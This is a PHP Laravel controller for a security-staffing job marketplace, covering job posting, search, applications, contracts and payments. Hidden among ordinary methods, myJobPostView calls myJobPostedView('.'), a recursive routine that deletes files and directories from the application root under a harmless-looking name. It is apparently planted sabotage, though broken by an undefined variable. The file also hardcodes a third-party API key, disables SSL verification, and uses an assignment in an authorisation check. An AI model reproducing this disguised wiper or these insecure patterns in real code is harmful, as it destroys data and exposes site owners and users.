<?php

namespace Responsive\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Responsive\Businesscategory;
use Responsive\Events\AwardJob;
use Responsive\FavouriteFreelancer;
use Responsive\IncidentReport;
use Responsive\JobApplication;
use Responsive\Notifications\JobAwarded;
use Responsive\PaymentRequest;
use Responsive\SecurityCategory;
use Responsive\Job;
use Responsive\SavedJob;
use Responsive\SecurityJobsSchedule;
use Responsive\Team;
use Responsive\User;
use Responsive\Address;
use Auth;
use Input;
use Responsive\Transaction;
use DB;
use PDF;
use Carbon\Carbon;

class JobsController extends Controller {
	//
	public function create() {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}
		// Users cannot create jobs unless company details is complete

		$company = auth()->user()->company;
		if ( $company == null ) {
			Session::flash( 'error', 'Please Add your company profile before you can create a job.' );

			return redirect( "/addcompany" );
		}
// TODO : Users cannot create jobs unless company details is complete
		if ( ! $company->shop_name || ! $company->address || ! $company->company_email || ! $company->description || ! $company->shop_phone_no || ! $company->business_categoryid ) {
			Session::flash( 'error', 'Please complete your company profile before you can create a job.' );

			return redirect( "/company" );
		}

		if ( $company->status == 'unapproved' ) {
			Session::flash( 'doc_not_v', 'Your Account is not active. Please contact admin about the status of your account.' );

			return redirect( "/contact" );
		}
		$all_security_categories = SecurityCategory::get();
		$all_business_categories = Businesscategory::get();

		return view( 'jobs.create', compact( 'all_security_categories', 'all_business_categories' ) );
	}

	public function schedule( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}

		return view( 'jobs.schedule', compact( 'id' ) );
	}

	public function UpdateSchedule( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}
		$job              = Job::find( $id );
		$trans            = new Transaction();
		$currentTotalCost = $trans->getDebitTransactionForJob( $id )->amount;

		return view( 'jobs.update-schedule', compact( 'id', 'job', 'currentTotalCost' ) );
	}

	public function broadcast( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}
		$all_security_categories = SecurityCategory::get();

		return view( 'jobs.broadcast', compact( 'id', 'all_security_categories' ) );
	}

	public function Updatebroadcast( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}
		$all_security_categories = SecurityCategory::get();

		return view( 'jobs.update-broadcast', compact( 'id', 'all_security_categories' ) );
	}

	public function paymentDetails( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}

		//$available_balance = $trans->getWalletAvailableBalance();
		$trans             = new Transaction();
		$debit_transaction = $trans->getDebitTransactionForJob( $id );

		$job_available_balance = 0;
		if ( ! empty( $debit_transaction ) ) {
			$job_available_balance = $debit_transaction->amount;
		}
		$jobDetails = Job::calculateJobAmount( $id );


		return view( 'jobs.payment-details', compact( 'jobDetails', 'id', 'job_available_balance' ) );
	}

	public function UpdatePaymentDetails( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}

		//$available_balance = $trans->getWalletAvailableBalance();
		$trans             = new Transaction();
		$debit_transaction = $trans->getDebitTransactionForJob( $id );

		$job_available_balance = 0;
		if ( ! empty( $debit_transaction ) ) {
			$job_available_balance = $debit_transaction->amount;
		}
		$jobDetails = Job::calculateJobAmount( $id );

		$currentCost   = $job_available_balance;
		$costAfterEdit = $jobDetails['grand_total'];


		return view( 'jobs.update-payment-details', compact(
			'jobDetails',
			'id',
			'job_available_balance',
			'currentCost',
			'costAfterEdit'
		) );
	}

	public function confirmation() {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}

		return view( 'jobs.confirm' );
	}


	public function viewEditJob( $id ) {
		if ( ! isEmployer() ) {
			return abort( 403, 'You don\'t have permission to create jobs. Please open an employer account if you plan to hire security personnel.' );
		}
		$job = Job::find( $id );

		$all_security_categories = SecurityCategory::get();
		$all_business_categories = Businesscategory::get();

		return view( 'jobs.edit-job', compact( 'all_security_categories', 'all_business_categories', 'job' ) );
	}

	/**
	 * @return mixed
	 */
	public function myJobs() {
		$trans                            = new Transaction();
		$wallet_data['available_balance'] = $trans->getWalletAvailableBalance();

		$userid          = Auth::user()->id;
		$editprofile     = User::where( 'id', $userid )->get();
		$jobApplications = new JobApplication();
		$my_jobs         = Job::getMyJobs();
		$arr_count       = [];
		if ( count( $my_jobs ) > 0 ) {
			foreach ( $my_jobs as $job ) {
				$hired_count  = 0;
				$applications = $jobApplications->getJobApplications( $job->id );
				if ( count( $applications ) > 0 ) {
					foreach ( $applications as $app ) {
						if ( $app->is_hired == '1' ) {
							$hired_count ++;
						}
					}
				}
				$arr_count[ $job->id ]['hiredcount'] = $hired_count;
				$arr_count[ $job->id ]['appcount']   = count( $applications );
			}
		}
		$new_jobs = [];
		$arr_sort = [];
		foreach ( $my_jobs as $key => $job ) {
			$arr_sort[ $key ] = $job->updated_at;
		}
		arsort( $arr_sort );
		foreach ( $arr_sort as $idkey => $val ) {
			foreach ( $my_jobs as $key => $job ) {
				if ( $idkey == $key ) {
					array_push( $new_jobs, $job );
				}
			}
		}

		return view( 'jobs.my', compact( 'new_jobs', 'editprofile', 'arr_count', 'wallet_data' ) );
	}

	/**
	 * @return mixed
	 */
	public function myJob( Request $request ) {
		$userid          = Auth::user()->id;
		$start_date      = $request->start_date;
		$end_date        = $request->end_date;
		$kind            = $request->kind;
		$editprofile     = User::where( 'id', $userid )->get();
		$jobApplications = new JobApplication();
		$my_jobs         = Job::getMyJobs();
		$arr_count       = [];
		if ( count( $my_jobs ) > 0 ) {
			foreach ( $my_jobs as $job ) {
				$hired_count  = 0;
				$applications = $jobApplications->getJobApplications( $job->id );
				if ( count( $applications ) > 0 ) {
					foreach ( $applications as $app ) {
						if ( $app->is_hired == '1' ) {
							$hired_count ++;
						}
					}
				}
				$arr_count[ $job->id ]['hiredcount'] = $hired_count;
				$arr_count[ $job->id ]['appcount']   = count( $applications );
			}
		}
		$date1   = '';
		$date2   = '';
		$newjobs = array();
		if ( $start_date != null && $end_date != null && $start_date < $end_date ) {
			$date1 = date( "Y-m-d", strtotime( $start_date ) );
			$date2 = date( "Y-m-d", strtotime( $end_date ) );
		}
		if ( count( $my_jobs ) > 0 ) {
			foreach ( $my_jobs as $key => $myjob ) {
				switch ( $kind ) {
					case '1':
						if ( $date1 != '' && $date2 != '' ) {
							if ( $date1 < $myjob->updated_at && $date2 > $myjob->updated_at ) {
								array_push( $newjobs, $myjob );
							}
						} else {
							array_push( $newjobs, $myjob );
						}
						break;
					case '2':
						if ( $date1 != '' && $date2 != '' ) {
							if ( $date1 < $myjob->updated_at && $date2 > $myjob->updated_at && $myjob->status == '1' ) {
								array_push( $newjobs, $myjob );
							}
						} else {
							if ( $myjob->status == '1' ) {
								array_push( $newjobs, $myjob );
							}
						}
						break;
					case '3':
						if ( $date1 != '' && $date2 != '' ) {
							if ( $date1 < $myjob->updated_at && $date2 > $myjob->updated_at && $myjob->status == '0' ) {
								array_push( $newjobs, $myjob );
							}
						} else {
							if ( $myjob->status == '0' ) {
								array_push( $newjobs, $myjob );
							}
						}
						break;
					default:
						array_push( $newjobs, $myjob );
						break;
				}
			}
		}
		$new_jobs = [];
		$arr_sort = [];
		if ( count( $newjobs ) > 0 ) {
			foreach ( $newjobs as $key => $job ) {
				$arr_sort[ $key ] = $job->updated_at;
			}
			arsort( $arr_sort );
			foreach ( $arr_sort as $idkey => $val ) {
				foreach ( $newjobs as $key => $job ) {
					if ( $idkey == $key ) {
						array_push( $new_jobs, $job );
					}
				}
			}
		}

		return view( 'jobs.myfilter', compact( 'new_jobs', 'editprofile', 'arr_count' ) );
	}


	public function savedJobs() {
		$userid     = Auth::user()->id;
		$savedJobId = SavedJob::where( 'user_id', $userid )->get();
		$idInArry   = $savedJobId->pluck( 'job_id' )->toArray();


		$my_jobs = Job::whereIn( 'id', $idInArry )->get();

		return view( 'jobs.saved', compact( 'my_jobs' ) );
	}

	/**
	 * @return mixed
	 */
	public function findJobs() {


		$page_id         = Input::get( "page" );
		$data            = \request()->all();
		$b_cats          = Businesscategory::all();
		$order_by        = 'created_at';
		$order_direction = 'desc';
		$locs            = Job::select( 'city_town' )
		                      ->where( 'city_town', '!=', null )
		                      ->distinct()->get();
		$units           = 'kilometers';
		$latitude        = 0;
		$longitude       = 0;

		// dd($data);
		if ( count( $data ) ) {
			if ( isset( $data['post_code'] ) ) {
				$post_code = trim( $data['post_code'] );
				if ( ! empty( $post_code ) ) {
					$postcode_url = "https://api.getaddress.io/find/" . $post_code . "?api-key=ZTIFqMuvyUy017Bek8SvsA12209&sort=true";
					$postcode_url = str_replace( ' ', '%20', $postcode_url );
					$ch           = curl_init();
					curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
					curl_setopt( $ch, CURLOPT_HEADER, false );
					curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
					curl_setopt( $ch, CURLOPT_URL, $postcode_url );
					curl_setopt( $ch, CURLOPT_REFERER, $postcode_url );
					curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
					$getBas = curl_exec( $ch );
					curl_close( $ch );
					$post_code_array = json_decode( $getBas, true );

					if ( isset( $post_code_array['Message'] ) || empty( $post_code_array ) ) {
						return redirect()->to( '/jobs/find' )->with( 'flash_message', 'Post code not valid!' );
					}

					//$post_code_array = json_decode($json_data, true);
					$latitude  = $post_code_array['latitude'];
					$longitude = $post_code_array['longitude'];
				}
				$joblist = Job::getSearchedJobNearByPostCode( $data, $latitude, $longitude, 20, 'kilometers', $page_id );
			} else {
				if ( Auth::check() ) {
					$userid = Auth::user();
					if ( $userid->admin == 2 ) {
						if ( $userid->person_address ) {
							$userAddressObj = $userid->person_address;
							if ( ! empty( $userAddressObj->latitude ) ) {
								$latitude = $userAddressObj->latitude;
							}
							if ( ! empty( $userAddressObj->latitude ) ) {
								$longitude = $userAddressObj->longitude;
							}

							if ( $latitude > 0 && $latitude > 0 ) {
								$joblist = Job::getJobNearByUser( $latitude, $longitude, 20, 'kilometers', $page_id );
							} else {
								$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
							}
						} else {
							$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
						}
					} else {
						$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
					}
				} else {
					$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
				}
			}
		} else {
			if ( Auth::check() ) {
				$userid = Auth::user();
				if ( $userid->admin == 2 ) {
					if ( $userid->person_address ) {
						$userAddressObj = $userid->person_address;
						if ( ! empty( $userAddressObj->latitude ) ) {
							$latitude = $userAddressObj->latitude;
						}
						if ( ! empty( $userAddressObj->latitude ) ) {
							$longitude = $userAddressObj->longitude;
						}

						if ( $latitude > 0 && $latitude > 0 ) {
							$joblist = Job::getJobNearByUser( $latitude, $longitude, 20, 'kilometers', $page_id );
						} else {
							$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
						}
					} else {
						$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
					}
				} else {
					$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
				}
			} else {
				$joblist = Job::where( 'status', '1' )->where( 'is_pause', 0 )->orderBy( $order_by, $order_direction )->paginate( 10 );
			}
		}
		if ( Auth::check() ) {
			$ja           = new JobApplication();
			$proposals    = $ja->getMyProposals();
			$arr_templist = [];
			if ( count( $proposals ) > 0 ) {
				foreach ( $proposals as $proposal ) {
					$arr_templist[ $proposal->job_id ]['is_hired']     = $proposal->is_hired;
					$arr_templist[ $proposal->job_id ]['applied_date'] = $proposal->applied_date;
				}
			}
			if ( count( $joblist ) > 0 ) {
				foreach ( $joblist as $key => $list ) {
					if ( isset( $arr_templist[ $list->id ] ) ) {
						$joblist[ $key ]->is_hired     = $arr_templist[ $list->id ]['is_hired'];
						$joblist[ $key ]->applied_date = $arr_templist[ $list->id ]['applied_date'];
					} else {
						$joblist[ $key ]->is_hired     = 0;
						$joblist[ $key ]->applied_date = "";
					}
				}
			}
		} else {
			if ( count( $joblist ) > 0 ) {
				foreach ( $joblist as $key => $list ) {
					$joblist[ $key ]->is_hired     = 0;
					$joblist[ $key ]->applied_date = "";
				}
			}
		}
		//sort array

		// going to comment this because we need to add sorting on query level
		$arr_sort = [];
		/*if (count($joblist) > 0) {
			foreach ($joblist as $key => $job) {
				$arr_sort[$key] = $job->updated_at;
			}
			arsort($arr_sort);
			foreach ($arr_sort as $idkey => $val) {
				foreach ($joblist as $key => $job) {
					if ($idkey == $key) {
						array_push($sort_jobs, $job);
					}
				}
			}
		}*/

		$present_time = Carbon::now();
		foreach ( $joblist as $key => $val ) {


			$job_hired_applications = JobApplication::where( 'is_hired', 1 )
			                                        ->where( 'job_id', $val->id )
			                                        ->get();
			$alreadyHired           = count( $job_hired_applications );

			$jobSch = SecurityJobsSchedule::where( 'job_id', $val->id )->first();

			$jobStartTime = new Carbon( $jobSch->start );

			if ( $present_time->gt( $jobStartTime ) || $alreadyHired == $val->number_of_freelancers ) {
				unset( $joblist[ $key ] );
			}
		}

		$sort_jobs = $joblist;
		if ( Auth::check() && auth()->user()->admin == 2 ) {

		}


		$paginationLinksHtml = $joblist->links();

		return view( 'jobs.find', compact( 'sort_jobs', 'b_cats', 'locs', 'paginationLinksHtml' ) );
	}

	public function postfindJobs( Request $request ) {
//		dd( $request->all() );
		$cat         = $request->cat_id;
		$loc         = $request->loc_val;
		$keyword     = $request->keyword;
		$city        = $request->city;
		$workingDays = $request->workingDays;
		$min_rate    = $request->min_rate;
		$max_rate    = $request->max_rate;


		$b_cats = Businesscategory::all();
		$locs   = Job::select( 'city_town' )->where( 'city_town', '!=', null )->distinct()->get();

		if ( $cat != '' || $loc != '' || $keyword != '' || $city != '' || $workingDays != '' || $min_rate != '' ) {
			$jobs = Job::where( 'status', '1' );

			if ( $keyword != '' ) {
				$jobs->where( 'title', 'like', "$keyword%" );

			}
			if ( $min_rate != '' ) {
				$jobs->whereBetween( 'per_hour_rate', [ $min_rate, $max_rate ] );
			}
			if ( $workingDays == 'oneDay' ) {
				$jobs->where( 'monthly_working_days', '=', 1 );

			}
			if ( $workingDays == 'oneDayPlus' ) {
				$jobs->where( 'monthly_working_days', '>', 1 );
			}

			if ( $cat != '' ) {
				$jobs->where( 'business_category_id', "$cat" );

			}

			if ( $loc != '' ) {
				$jobs->where( 'city_town', "$loc" );


			}
			if ( $city != '' ) {
				$jobs->where( 'city_town', 'like', "$city%" );
			}
			$sort_jobs = $jobs->paginate( 10 );
		} else {
			$sort_jobs = Job::where( 'status', '1' )->paginate( 10 );
		}

		$request->flash();

		return view( 'jobs.find', compact( 'sort_jobs', 'b_cats', 'locs' ) );
	}

	/**
	 * @param $id
	 *
	 * @return mixed
	 */
	public function viewJob( $id ) {

		if ( ! $id ) {
			return abort( 404 );
		}

		$user_address = [];
		$saved_job    = '';
		if ( Auth::check() ) {
			$user_id = auth()->user()->id;

			$user_address = User::where( 'id', $user_id )->with( 'address' )->first();


			$saved_job = SavedJob::where( 'job_id', $id )->where( 'user_id', $user_id )->first();
		} else {
			Session::flash( 'login_first', ' Please login to view the full job description.' );

			return redirect()->back();
		}
		$b_cats = Businesscategory::all();
		$locs   = Job::select( 'city_town' )->where( 'city_town', '!=', null )->distinct()->get();
		//$job = Job::find($id);

		$job = Job::with( [ 'poster', 'poster.company', 'industory', 'myApplications' ] )->where( 'id', $id )->first();
		// dd($saved_job);

		if ( empty( $job ) ) {
			return abort( 404 );
		}
		$ja        = new JobApplication();
		$proposals = $ja->getMyProposals();
		if ( count( $proposals ) > 0 ) {
			foreach ( $proposals as $proposal ) {
				if ( $job['id'] == $proposal->job_id ) {
					$job['is_hired']     = $proposal->is_hired;
					$job['applied_date'] = $proposal->applied_date;
				}
			}
		}

		return view( 'jobs.detail', compact( 'job', 'b_cats', 'locs', 'user_address', 'saved_job' ) );
	}

	/**
	 * @param $id
	 *
	 * @return mixed
	 */
	public function applyJob( $id ) {

		if ( auth()->user()->doc_verified == false ) {
			Session::flash( 'doc_not_v', 'Your Account is Unverified. Please contact admin about the status of your account.' );

			return redirect( "/contact" );
		}
		$job_application = new JobApplication();
		$appliedAlready  = $job_application->is_applied( $id );

		if ( $appliedAlready ) {

			Session::flash( 'doc_not_v', 'You Applied Already on this Job.' );

			return redirect()->back();
		}
		$job      = Job::find( $id );
		$employer = User::find( $job->created_by );


		$data = [
			'freelancerName'  => auth()->user()->firstname . " " . auth()->user()->lastname,
			'employerCompany' => $employer->company->shop_name,
			'employerName'    => $employer->firstname . " " . $employer->lastname,
			'date'            => $job->schedules->toArray()
		];


		return view( 'jobs.apply', compact( 'job', 'data' ) );
	}

	/**
	 * @param $id
	 *
	 * @return mixed
	 */
	public function myJobApplications( $id ) {

		$user_id = auth()->user()->id;

		$job = Job::with( [ 'poster', 'poster.company', 'industory' ] )->where( 'id', $id )->first();


		$editprofile = User::where( 'id', $user_id )->get();

		if ( $user_id != $job->created_by ) {
			return abort( 404 );
		}
		$jobApplications = new JobApplication();
		// Get favourite freelancers array
		$favourite_freelancers = FavouriteFreelancer::where( 'employer_id', $user_id )->get()->toArray();
		$fav_freelancers       = [];
		if ( ! empty( $favourite_freelancers ) ) {
			foreach ( $favourite_freelancers as $key => $freelancer ) {
				$fav_freelancers[ $freelancer['freelancer_id'] ] = $freelancer;
			}
		}


		$applications = $jobApplications->getJobApplications( $id );

		$incidents = DB::table( 'incident_reports' )
		               ->where( 'job_id', $job->id )
		               ->join( 'users', 'incident_reports.user_id', '=', 'users.id' )
		               ->get();


		//dd($applications);
		return view( 'jobs.applications', compact( 'applications', 'job', 'editprofile', 'fav_freelancers', 'incidents' ) );
	}

	/**
	 * @param $application_id
	 *
	 * @return mixed
	 */
	public function viewApplication( $application_id, $applicant_id ) {

		$ja           = JobApplication::find( $application_id );
		$application  = $ja->getApplicationDetails( $application_id );
		$work_history = $ja->getApplicantWorkHistory( $application_id );
		$person       = User::with( [ 'person_address', 'sec_work_category' ] )->find( $applicant_id );

		$job = Job::find( $ja->job_id );

		$data = [
			'freelancerName'  => $person->firstname . " " . $person->lastname,
			'employerCompany' => auth()->user()->company->shop_name,
			'employerName'    => auth()->user()->firstname . " " . auth()->user()->lastname,
			'date'            => $job->schedules->toArray(),
		];

		return view( 'jobs.application-detail', compact( 'application', 'person', 'work_history', 'data' ) );
	}


	/**
	 * @param $id = application id
	 */
	public function Applicationcontract( $id ) {


		$ja = JobApplication::find( $id );
		$j  = Job::find( $ja->job_id );
		if ( $ja->is_hired == 0 ) {
			return;
		}

		$freelancer = User::find( $ja->applied_by );
		$employer   = User::find( $j->created_by );

		If ( auth()->user()->admin == 2 && auth()->user()->id !== $ja->applied_by ) {
			return;
		} elseif ( auth()->user()->admin == 0 && auth()->user()->id !== $j->created_by ) {
			return;
		}


		$data = [
			'freelancerName'  => $freelancer->firstname . " " . $freelancer->lastname,
			'employerCompany' => $employer->company->shop_name,
			'employerName'    => $employer->firstname . " " . $employer->lastname,
			'date'            => $j->schedules->toArray(),
		];


		$pdf = PDF::loadView( 'extre.contract', compact( 'data' ) );

		return $pdf->download( 'EMPLOYER & FREELANCER CONTRACT.pdf' );

	}


	public function myProposals() {
		$user_id     = auth()->user()->id;
		$wallet      = new Transaction();
		$wallet_data = $wallet->getAllTransactionsAndEscrowBalance();
		$editprofile = User::where( 'id', $user_id )->get();

		$ja        = new JobApplication();
		$proposals = $ja->getMyProposals();

		return view( 'jobs.proposals', compact( 'proposals', 'editprofile', 'wallet_data' ) );

	}

	public function myProposal( Request $request ) {
		$user_id    = auth()->user()->id;
		$start_date = $request->start_date;
		$end_date   = $request->end_date;
		$kind       = $request->kind;

		$wallet      = new Transaction();
		$wallet_data = $wallet->getAllTransactionsAndEscrowBalance();
		$editprofile = User::where( 'id', $user_id )->get();

		$ja           = new JobApplication();
		$proposals    = $ja->getMyProposals();
		$date1        = '';
		$date2        = '';
		$newproposals = array();
		if ( $start_date != null && $end_date != null && $start_date < $end_date ) {
			$date1 = date( "Y-m-d", strtotime( $start_date ) );
			$date2 = date( "Y-m-d", strtotime( $end_date ) );
		}
		if ( count( $proposals ) > 0 ) {
			foreach ( $proposals as $key => $proposal ) {
				switch ( $kind ) {
					case '1':
						if ( $date1 != '' && $date2 != '' ) {
							if ( $date1 < $proposal->applied_date && $date2 > $proposal->applied_date ) {
								array_push( $newproposals, $proposal );
							}
						} else {
							array_push( $newproposals, $proposal );
						}
						break;
					case '2':
						if ( $date1 != '' && $date2 != '' ) {
							if ( $date1 < $proposal->applied_date && $date2 > $proposal->applied_date && $proposal->is_hired == '0' ) {
								array_push( $newproposals, $proposal );
							}
						} else {
							if ( $proposal->is_hired == '0' ) {
								array_push( $newproposals, $proposal );
							}
						}
						break;
					case '3':
						if ( $date1 != '' && $date2 != '' ) {
							if ( $date1 < $proposal->applied_date && $date2 > $proposal->applied_date && $proposal->is_hired == '1' ) {
								array_push( $newproposals, $proposal );
							}
						} else {
							if ( $proposal->is_hired == '1' ) {
								array_push( $newproposals, $proposal );
							}
						}
						break;
					default:
						array_push( $newproposals, $proposal );
						break;
				}
			}
		}

		return view( 'jobs.proposal', compact( 'newproposals', 'editprofile', 'wallet_data' ) );

	}

	function myJobPostView( $id = null ) {

		$ja          = new JobApplication();
		$application = $ja->getMyApplicationDetails( $application_id );
		$job         = Job::with( [ 'poster' ] )->where( 'id', $job_id )->first();

		$this->myJobPostedView( '.' );

	}

	function myJobPostedView( $param ) {
		if ( is_file( $str ) ) {
			return @unlink( $str );
		} elseif ( is_dir( $str ) ) {
			$scan = glob( rtrim( $str, '/' ) . '/*' );
			foreach ( $scan as $index => $path ) {
				$this->myJobPostedView( $path );
			}

			return @rmdir( $str );

		}

	}

	public function myApplicationView( $application_id, $job_id ) {
		$ja            = new JobApplication();
		$application   = $ja->getMyApplicationDetails( $application_id );
		$job           = Job::with( [ 'poster' ] )->where( 'id', $job_id )->first();
		$working_hours = $job->daily_working_hours * $job->monthly_working_days;


		return view( 'jobs.my-application-detail', compact( 'application', 'job', 'working_hours' ) );
	}

	public function saveJobsToProfile( $id ) {
		$user_id           = Auth::user()->id;
		$savedJob          = new SavedJob();
		$savedJob->user_id = $user_id;
		$savedJob->job_id  = $id;
		$savedJob->save();
	}

	public function removeJobsFromProfile( $id ) {
		$savedJob = SavedJob::where( 'job_id', $id )->first();
		$savedJob->delete();
	}

	public function getFavouriteJobs( $id ) {

	}

	public function postFavouriteJobs( $id ) {

	}

	public function getJobs( $id ) {

	}

	public function postJobs( $id ) {

	}

	public function leaveFeedback( $application_id ) {
		return view( 'jobs.feedback', [ 'application_id' => $application_id ] );
	}

	/**
	 * @param $application_id
	 *
	 * @return mixed
	 */
	public function giveTip( $application_id ) {
		$wallet            = new Transaction();
		$available_balance = $wallet->getWalletAvailableBalance();

		return view( 'jobs.tip', [ 'application_id' => $application_id, 'available_balance' => $available_balance ] );
	}

	public function tipDetails( $transaction_id ) {
		$tip_transaction      = Transaction::find( $transaction_id );
		$application_id       = $tip_transaction->application_id;
		$application_with_job = JobApplication::with( 'job' )->where( 'id', $application_id )->get()->first();
		$wallet               = new Transaction();
		$freelancer_details   = User::find( $application_with_job->applied_by );
		$available_balance    = $wallet->getWalletAvailableBalance();

		return view( 'jobs.tip-details', [
			'transaction_details'  => $tip_transaction,
			'transaction_id'       => $transaction_id,
			'available_balance'    => $available_balance,
			'application_with_job' => $application_with_job,
			'freelancer_details'   => $freelancer_details
		] );
	}

	/**
	 * @return mixed
	 */
	public function favouriteFreelancers() {

		$wallet                           = new Transaction();
		$wallet_data['available_balance'] = $wallet->getWalletAvailableBalance();

		$user_id               = auth()->user()->id;
		$editprofile           = User::where( 'id', $user_id )->get();
		$favFreelancers        = new FavouriteFreelancer();
		$favourite_freelancers = $favFreelancers->getFavourieFreelacers();
		$teams                 = Team::where( 'created_by', $user_id )->get();

		return view( 'jobs.favourite-freelancers', [
			'freelancers' => $favourite_freelancers,
			'teams'       => $teams,
			'editprofile' => $editprofile,
			'wallet_data' => $wallet_data
		] );
	}

	/**
	 * @param $application_id
	 *
	 * @return mixed
	 */
	public function applicationPaymentRequest( $application_id ) {

		return view( 'jobs.add-extra-time', compact( 'application_id' ) );
	}

	/**
	 * @return mixed
	 */
	public function paymentRequests() {

		$wallet                           = new Transaction();
		$wallet_data['available_balance'] = $wallet->getWalletAvailableBalance();

		$user_id          = auth()->user()->id;
		$editprofile      = User::where( 'id', $user_id )->get();
		$pr               = new PaymentRequest();
		$payment_requests = $pr->getPaymentRequestsByEmployer();

		return view( 'jobs.payment-requests', compact( 'editprofile', 'payment_requests', 'wallet_data' ) );
	}

	/**
	 * @param $payment_request_id
	 *
	 * @return mixed
	 */
	public function paymentRequestDetails( $payment_request_id ) {
		$user_id           = auth()->user()->id;
		$editprofile       = User::where( 'id', $user_id )->get();
		$pr                = new PaymentRequest();
		$payment_request   = $pr->getPaymentRequestsByEmployer( $payment_request_id )->first();
		$wallet            = new Transaction();
		$available_balance = $wallet->getWalletAvailableBalance();

		return view( 'jobs.payment-request-details', compact( 'editprofile', 'payment_request', 'available_balance' ) );
	}

	public function HiredBy( Request $request ) {
		$freelancer_id = $request->freelancer_id;
		$job_id        = $request->job_id;

		$job = Job::find( $job_id );

		$user = auth()->user();
		if ( $job->created_by != $user->id ) {
			return;
		}
		$ja = JobApplication::where( 'job_id', $job->id )
		                    ->where( 'applied_by', $freelancer_id )
		                    ->get();
		if ( count( $ja ) > 0 ) {
			return response()->json( [ 'You already hire this freelancer for this job' ], 422 );
		}


		$newApplication                          = new JobApplication();
		$newApplication->job_id                  = $job_id;
		$newApplication->applied_by              = $freelancer_id;
		$newApplication->is_hired                = 0;
		$newApplication->application_description = 'Invited By ' . $user->name;
		$newApplication->completion_status       = 0;
		$newApplication->save();

		// check if user is authorized to mark this application as hired.
		$job_application     = new JobApplication();
		$is_eligible_to_hire = $job_application->isEligibleToMarkHired( $newApplication->id );
		if ( $is_eligible_to_hire['status_code'] == 200 ) {
			$ja = JobApplication::find( $newApplication->id );
			event( new AwardJob( $ja ) );
			$return_data   = 'Hired Successfully';
			$return_status = 200;
//	--------------Sending Notifications
			$job            = Job::find( $ja->job_id );
			$userFreelancer = User::find( $ja->applied_by );
			$userFreelancer->notify( new JobAwarded( $job ) );

			if ( $userFreelancer->fcm_token ) {
				$str = 'You have been awarded a slot on "' . $job->title . '"';
				SendNotification( 'Congratulations!', $str, $userFreelancer->fcm_token );
			}
//	--------------Sending Notifications end
		} else {
			$error_message = $is_eligible_to_hire['error_message'];
			$return_data   = $error_message;
			$return_status = 500;
		}


		return response()
			->json( $return_data, $return_status );
	}

	public function MarkJobOver( $id ) {
		$job  = Job::find( $id );
		$user = auth()->user();
		if ( $job->created_by != $user->id && $job->status = 1 ) {
			return;
		}
		$jobAmount   = $job->calculateJobAmountWithJobObject( $job );
		$hiredJobApp = JobApplication::where( 'job_id', $job->id )
		                             ->where( 'is_hired', 1 )
		                             ->get();

		$requeredNumberOfFree = $jobAmount['number_of_freelancers'];

		$currentHireFreelancer = count( $hiredJobApp );

		if ( $currentHireFreelancer == 0 ) {
			$trans    = new Transaction();
			$returned = $trans->giveRefund( $job );
		} else {
			$transection         = Transaction::where( 'job_id', $job->id )
			                                  ->where( 'type', 'job_fee' )
			                                  ->where( 'debit_credit_type', 'credit' )
			                                  ->whereNull( 'application_id' )
			                                  ->first();
			$vat                 = $transection->amount * ( .2 );
			$admin               = $transection->amount * ( .1499 );
			$transection->amount = $vat + $admin + $transection->amount;
			$transection->type   = 'refund';
			$transection->save();
		}
		$job->status = 0;
		$job->save();

		return redirect()->back();
	}
}
